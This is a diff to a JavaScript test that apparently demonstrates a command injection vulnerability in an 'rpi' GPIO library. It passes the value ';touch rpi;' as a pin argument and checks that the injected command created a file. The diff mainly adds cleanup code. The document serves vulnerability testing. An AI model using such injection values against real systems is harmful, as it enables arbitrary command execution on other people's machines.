@@ -4,17 +4,17 @@ test("Command Injection in rpi", () => {
   const fs = require("fs");
   const path = "./rpi";
   const sleep = require("sleep");
-
-  //checking that its not present already
+  try {
+    fs.unlinkSync(path);
+    console.log("File removed:", path);
+  } catch (err) {
+    console.error(err);
+  }
   file_exist = fs.existsSync(path);
   expect(file_exist).toBe(false);
-
   let pin = new RPI.GPIO(";touch rpi;", "123");
-
   sleep.sleep(5);
-  //checking that its created by after exploit.
   file_exist = fs.existsSync(path);
   expect(file_exist).toBe(true);
-
-  fs.unlink(path, function (err) {}); //deleting the file after creation
+  fs.unlink(path, function (err) {});
 });
